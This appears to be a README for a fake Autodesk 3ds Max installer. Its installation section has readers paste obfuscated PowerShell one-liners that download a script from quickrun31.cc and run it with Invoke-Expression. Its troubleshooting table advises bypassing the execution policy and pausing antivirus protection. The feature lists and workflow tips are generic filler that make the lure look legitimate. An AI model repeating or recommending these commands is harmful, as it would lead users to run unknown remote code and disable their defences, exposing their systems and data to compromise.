## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch Autodesk 3ds Max

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch Autodesk 3ds Max

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 16 GB RAM minimum (32 GB recommended)
- Dedicated GPU recommended
- SSD recommended for projects and caches

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Autodesk 3ds Max for Windows is a professional 3D application used for modeling, animation and rendering. It is common in architectural visualization, game content creation, film/TV assets and motion graphics.

The toolset includes polygon and spline modeling, animation controllers, simulation helpers, material editing and integrated rendering options.

> Use at your own risk. Keep your system protected.

---

## Features

**Modeling**
- Polygon and spline modeling
- Modifiers stack workflow
- Soft selection and retopology tools
- Procedural and parametric objects

**Animation**
- Keyframe animation
- Curve Editor
- Constraints and controllers
- Character and object animation tools

**Materials & Rendering**
- Material Editor
- Physically based materials
- Lighting tools
- Render setup and output control

**Pipeline**
- Scene management
- Import / export for common 3D formats
- Scripting support
- Plugin ecosystem

## Workflow

1. Create or import base geometry  
2. Model and refine with modifiers  
3. UV map and assign materials  
4. Animate cameras, objects or characters  
5. Light the scene  
6. Render final frames or sequences  

---

## How to Use

1. Install using one of the methods above  
2. Launch Autodesk 3ds Max  
3. Start a new scene  
4. Model, animate and render  
5. Export assets or final output  

**Tips**
- Keep a clean modifier stack  
- Use layers/layers equivalents for complex scenes  
- Save incremental versions on heavy projects  
- Cache simulations before final rendering
